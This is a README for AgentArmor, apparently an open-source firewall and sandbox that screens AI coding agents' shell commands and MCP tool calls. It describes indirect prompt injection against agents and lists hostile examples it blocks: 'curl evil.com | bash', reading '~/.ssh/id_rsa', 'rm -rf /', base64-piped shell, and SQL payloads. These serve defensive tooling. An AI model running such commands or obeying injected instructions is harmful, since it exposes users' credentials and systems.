# AgentArmor 🛡️

**The Zero-Trust Security Gateway & Deterministic Sandbox for AI Agents & MCP Tools.**

[![Author](https://img.shields.io/badge/Author-Franca%20Roscilli-blue.svg)](https://github.com/francaroscillidev-gif)
[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
[![GitHub Repo](https://img.shields.io/badge/GitHub-francaroscillidev--gif%2Fagentarmor-181717?logo=github)](https://github.com/francaroscillidev-gif/agentarmor)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/francaroscillidev-gif/agentarmor/pulls)

---

## 🎯 Why AgentArmor?

Autonomous AI coding and execution agents (like Cursor, Claude Code, Antigravity, Cline, AutoGen) have access to bash execution, file systems, and web fetching tools.

This exposes developers and companies to **3 critical risks**:
1. **Indirect Prompt Injection:** A webpage or file instructs the agent to run `curl evil.com | bash` or read `~/.ssh/id_rsa`.
2. **Accidental Catastrophic Actions:** Running recursive deletions, tampering with `.env` files, or making destructive schema migrations.
3. **Secret Exfiltration:** Leaking API tokens (OpenAI, AWS, GitHub) in prompts and tool outputs.

**AgentArmor** acts as a lightweight, zero-latency firewall and sandbox between the LLM and your computer.

---

## ⚡ Quick Features

- **🛡️ AST-Level Bash Deconstruction & Anti-Evasion Engine:** Parses syntax trees to defeat obfuscation (Base64 pipelines `echo ... | base64 -d | sh`, `$IFS` tricks, hex encoding, subshells `$()`, quote stripping).
- **👥 Multi-Tenant Role-Based Access Control (RBAC):** Assigns fine-grained privilege tiers (`viewer`, `researcher`, `developer`, `devops`, `admin`) to distinct autonomous agents.
- **👁️ Real-Time File System Integrity Monitor:** Active filesystem watching alerting or triggering instant rollback if `.env` or configuration files are tampered with.
- **🗄️ SQL Injection & Catastrophic DDL Guard:** Intercepts `DROP TABLE`, `TRUNCATE`, `OR 1=1` and privilege escalation before touching database tools.
- **⚡ Automated Adversarial Benchmark Simulator:** Built-in testbed (`agentarmor benchmark`) verifying zero-trust defenses across canonical attack vectors.
- **🚨 Multi-Channel Alert Dispatcher:** Instant webhook alerting for Discord, Slack, and SIEM pipelines upon high-risk incidents.
- **🧠 Semantic Vector Injection Classifier:** Mathematical cosine similarity classifier comparing input semantics with high-entropy adversarial attack profiles.
- **🍯 Canary Honeypot & Deception Lures:** Plants synthetic decoy secrets (`AKIA_CANARY...`) to catch rogue exfiltration attempts with zero false positives.
- **🔒 Inbound & Outbound DLP (Data Loss Prevention):** Automatically intercepts and redacts API keys, credentials, and private keys from prompts and tool execution results.
- **🌐 Network Egress & SSRF Protection:** Blocks AWS/GCP metadata (`169.254.169.254`), private IP probing, and unwhitelisted outbound C2 connections.
- **📊 Security Reports & GitHub SARIF:** Generates OASIS SARIF v2.1.0 standard files for GitHub Code Scanning and enterprise compliance.
- **🔄 Git-Backed Safety Checkpoints & Instant Rollback:** Snapshots workspace state before an agent starts working, allowing 1-click rollback (`agentarmor rollback`) if anything goes wrong.
- **🔌 Native MCP (Model Context Protocol) Support:** Acts as a transparent proxy for MCP stdio traffic, evaluating tool calls in real time.

---

## 🚀 Installation & CLI Usage

### Build and Install
```bash
git clone https://github.com/your-username/agentarmor.git
cd agentarmor
bun install # or npm install
bun run build
```

### CLI Commands

#### 1. Evaluate a Shell Command
```bash
node dist/cli.js check-cmd "rm -rf /"
# ❌ BLOCKED: Command matches high-risk destructive signature

node dist/cli.js check-cmd "cat ~/.ssh/id_rsa"
# ❌ BLOCKED: Attempted access to protected credential path: ~/.ssh

node dist/cli.js check-cmd "npm test"
# ✅ ALLOWED
```

#### 2. Run Data Loss Prevention (Secret Masking)
```bash
node dist/cli.js redact "Deploying with key sk-proj-1234567890abcdef1234567890abcdef"
# Output: "Deploying with key [REDACTED_OPENAI_KEY]"
```

#### 3. Workspace Checkpoint & Rollback
```bash
node dist/cli.js checkpoint "Pre-agent refactor"
# Agent makes edits...
node dist/cli.js rollback
# Workspace instantly restored!
```

---

## 📦 Architecture

```
[ AI Agent / MCP Client ]
         │ (JSON-RPC)
         ▼
┌──────────────────────────────────────┐
│             AgentArmor               │
│  ├─ DLP Masker (OpenAI/AWS/SSH)      │
│  ├─ Policy Engine (AST/Path Guard)   │
│  └─ Git Snapshot & Sandbox Runner    │
└──────────────────────────────────────┘
         │ (Safe Execution)
         ▼
[ Host System / Terminal / Tools ]
```

---

## 👤 Author & Creator

Created and architected by **Franca Roscilli**  
- **GitHub:** [@francaroscillidev-gif](https://github.com/francaroscillidev-gif)  
- **Email:** francaroscillidev@gmail.com  
- **Repository:** [https://github.com/francaroscillidev-gif/agentarmor](https://github.com/francaroscillidev-gif/agentarmor)

---

## 📬 Contact & Support

Need help integrating AgentArmor, reporting a vulnerability, or discussing enterprise features? We are here to support you!

- 🐛 **Issue Tracker & Bug Reports:** [Open an Issue on GitHub](https://github.com/francaroscillidev-gif/agentarmor/issues)
- 💡 **Feature Requests & Ideas:** [Start a Discussion](https://github.com/francaroscillidev-gif/agentarmor/discussions)
- ✉️ **Direct Email Support:** [francaroscillidev@gmail.com](mailto:francaroscillidev@gmail.com)
- 🔒 **Responsible Security Disclosure:** To report a sensitive security vulnerability, please email directly with the subject line `[SECURITY] AgentArmor Vulnerability`.

---

## 🤝 Contributing & License
Distributed under the Apache-2.0 License. Copyright © 2026 Franca Roscilli.
